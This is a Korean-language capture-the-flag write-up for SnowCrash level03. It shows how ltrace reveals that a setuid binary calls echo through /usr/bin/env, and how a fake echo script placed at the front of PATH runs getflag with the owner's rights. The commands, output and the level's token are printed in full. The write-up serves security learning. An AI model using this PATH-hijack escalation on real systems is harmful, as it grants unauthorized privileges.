# Level03

## 파일 찾기 및 실행

```zsh
level03@SnowCrash:~$ ls -al
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
level03@SnowCrash:~$ ./level03
Exploit me
```

이 경우 s 권한이 있는 파일을 실행할 때는 이 파일이 소유한 권한으로 실행되므로 안에서 getflag를
실행하면 flag03이 실행한것과 같다.
즉, su flag03을 하기위해서 비밀번호를 찾지않아도된다.

## ltrace

ltrace는 Linux에서 사용할 수 있는 명령어 중 하나입니다. 함수가 아니라 프로그램입니다.

ltrace는 실행파일이 호출하는 라이브러리 함수들의 동작을 추적하여 출력해주는 도구입니다. 따라서 실행파일 내부의 함수 호출과 매개변수, 반환값 등을 추적하여 디버깅이나 분석에 사용될 수 있습니다.

```zsh
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                            = 2003
geteuid()                                                                                            = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                  = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                  = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                               = 0
+++ exited (status 0) +++
```

## /usr/bin/env

/usr/bin/env는 유닉스 및 리눅스에서 사용되는 명령어로, 실행할 프로그램의 경로를 환경변수로부터 찾아 실행합니다.
즉, echo를 내가 따로 설정할수있다.

즉, echo안에 getflag를 넣어서 실행시키면된다.

## getflag

```zsh
level03@SnowCrash:~$ whereis getflag
getflag: /bin/getflag
```

## echo 파일 만들기 및 PATH의 맨앞에 경로 저장

```zsh
level03@SnowCrash:~$ mkdir /tmp/level03
level03@SnowCrash:~$ vim /tmp/level03/echo
#!/bin/bash
/bin/getflag
level03@SnowCrash:~$ chmod +x /tmp/level03/echo
level03@SnowCrash:~$ export PATH="/tmp/level03:$PATH"
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04 
Password: 
level04@SnowCrash:~$ 
```
